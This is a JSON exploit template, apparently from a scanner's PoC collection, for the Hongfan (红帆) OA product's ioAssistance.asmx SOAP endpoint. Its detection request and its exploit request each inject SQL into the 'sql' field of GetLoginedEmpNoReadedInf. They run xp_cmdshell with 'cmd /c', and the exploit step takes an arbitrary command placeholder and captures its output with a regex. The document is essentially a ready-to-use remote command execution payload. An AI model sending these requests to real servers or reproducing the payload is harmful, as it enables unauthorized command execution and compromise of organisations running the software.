hongfan/红帆OA_ioAssistance命令执行.json

{  "name":"红帆OA_ioAssistance命令执行",  "tag":"hongfan",  "type":"exec",  "poc": {    "pocGet": "/ioffice/prg/set/wss/ioAssistance.asmx",    "pocPost": "<?xml version=\"1.0\" encoding=\"utf-8\"?>\r\r\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\r\r\n  <soap:Body>\r\r\n    <GetLoginedEmpNoReadedInf xmlns=\"http://tempuri.org/\">\r\r\n      <sql>exec master.dbo.xp_cmdshell 'cmd /c  echo qaxnb'</sql>\r\r\n    </GetLoginedEmpNoReadedInf>\r\r\n  </soap:Body>\r\r\n</soap:Envelope>",    "header": {      "content-Type": "text/xml; charset=utf-8",      "User-Agent": "Mozilla/5.0 (Linux;",      "X-Requested-With": "XMLHttpRequest",      "SOAPAction": "http://tempuri.org/GetLoginedEmpNoReadedInf"    },    "status_code":"200",    "pattern": "(qaxnb)"  },  "exp": {    "step1": {      "expGet": "/ioffice/prg/set/wss/ioAssistance.asmx",      "expPost": "<?xml version=\"1.0\" encoding=\"utf-8\"?>\r\r\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\r\r\n  <soap:Body>\r\r\n    <GetLoginedEmpNoReadedInf xmlns=\"http://tempuri.org/\">\r\r\n      <sql>exec master.dbo.xp_cmdshell 'cmd /c  {{command}}'</sql>\r\r\n    </GetLoginedEmpNoReadedInf>\r\r\n  </soap:Body>\r\r\n</soap:Envelope>",      "header": {        "content-Type": "text/xml; charset=utf-8",        "User-Agent": "Mozilla/5.0 (Linux;",        "X-Requested-With": "XMLHttpRequest",        "SOAPAction": "http://tempuri.org/GetLoginedEmpNoReadedInf"      },      "status_code":"200",      "pattern": "<output>(.*)</output>"    }  }}